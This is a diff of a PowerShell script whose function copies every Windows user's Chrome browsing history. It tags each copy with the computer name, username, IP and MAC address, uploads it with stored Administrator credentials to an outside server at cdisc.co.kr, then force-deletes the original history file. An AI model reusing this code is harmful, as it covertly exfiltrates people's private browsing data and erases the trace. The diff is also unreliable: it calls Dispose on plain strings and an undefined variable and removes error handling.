@@ -29,10 +29,9 @@ $sn = $sn
 
 function Copy_Up_Chrome
 {
-    Copy-Item 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\History' -Destination C:\ProgramData\soalog\${env:COMPUTERNAME}_${env:USERNAME}_${env:hostIP}_${env:hostMAC}_$sn_$(get-date -f yyyyMMddHH)_ChromeHistory
+    Copy-Item 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\History' -Destination C:\ProgramData\soalog\${env:COMPUTERNAME}_${env:USERNAME}_${env:hostIP}_${env:hostMAC}_$sn_$(get-date -f yyyyMMddHHmmss)_ChromeHistory
 
-    if($?)
-    {
+    
         Import-Module bitstransfer
         $enc = Get-Content C:\Windows\soa\enp.txt | ConvertTo-SecureString # specify the directory where the encrypted password file is located
         $user = "Administrator" # server ID
@@ -42,11 +41,7 @@ function Copy_Up_Chrome
         foreach {
         $dst = "http://cdisc.co.kr:1024/soa/upload/$($_.name)" # server directory with write permissions
         $job = Start-BitsTransfer -source $($_.FullName) -Destination $dst -Credential $cred -TransferType Upload -Asynchronous
-     while (($job.jobstate -eq "TransientError"))
-    {
-    sleep 10;
-    Resume-BitsTransfer
-    }
+
     while (($job.jobstate -eq "Transferring") -or ($job.jobstate -eq "Connecting")) `
     {sleep 10;}
     if ($job.JobState -eq "Transferred")
@@ -59,11 +54,16 @@ function Copy_Up_Chrome
     "TransientError" {Resume-BitsTransfer -BitsJob $job}
     "Error" {Resume-BitsTransfer -BitsJob $job}
     }
+    $dst.Dispose()
+    $job.Dispose()
     }
-
+    $enc.Dispose()
+    $user.Dispose()
+    $cred.Dispose()
+    $src.Dispose()
    Remove-Item -Path 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\History' -Force
 }
-}
+
 
 
 if(get-process chrome)
